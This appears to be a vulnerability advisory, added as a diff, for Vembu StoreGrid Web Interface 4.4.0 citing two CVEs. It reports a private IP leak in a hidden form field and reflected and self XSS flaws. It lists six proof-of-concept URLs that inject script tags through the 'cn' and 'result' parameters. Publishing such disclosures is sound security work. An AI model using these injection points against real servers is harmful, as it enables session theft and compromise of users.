@@ -1,0 +1,22 @@
+# Exploit Title: Vembu Storegrid Web Interface 4.4.0 - Multiple Vulnerabilities 
+# Discovery Date: 2018-12-05 
+# Exploit Author: Gionathan "John" Reale 
+# Vendor Homepage: https://www.vembu.com/ 
+# Software Link : N/A
+# Google Dork: N/A
+# Version: 4.4.0 
+# CVE : CVE-2014-10078,CVE-2014-10079
+Description StoreGrid enables you to offer an automated online backup service to your customers and is designed to be flexible to your needs. Upon investigating the web interface I discovered multiple vulnerabilities. 
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
+Information Disclosure. The front page of the server web interface leaks the private IP address in the hidden form "ipaddress" around line 80. 
+========================================================================================================================== 
+Reflected XSS. The server web interface contains multiple reflected XSS exploits that do not require authentication. 
+https://xxxxxxxx.xx:6061/interface/registercustomer/onlineregsuccess.php?cn=</font><script>alert(1);</script><font>&result= 
+https://xxxxxxxx.xx:6061//interface/registercustomer/onlineregsuccess.php?cn=</font><script>alert(1);</script><font>&result= 
+https://xxxxxxxx.xx:6061/interface/registercustomer/onlineregsuccess.php?cn=</font><script>alert(1);</script><font>&result= 
+https://xxxxxxxxx.xx:6061/interface/registerreseller/onlineregfailure.php?cn=gar&result=</font><script>alert(1);</script><font> 
+https://xxxxxxxxx.xx:6061/interface/registerclient/onlineregfailure.php?cn=gar&result=</font><script>alert(1);</script><font> 
+https://xxxxxxxx.xx:6061/interface/registercustomer/onlineregfailure.php?cn=gar&result=</font><script>alert(1);</script><font> 
+============================================================================================================================= 
+Self XSS. The server web interface contains a self XSS in the search function. 
+==============================================================================================================================
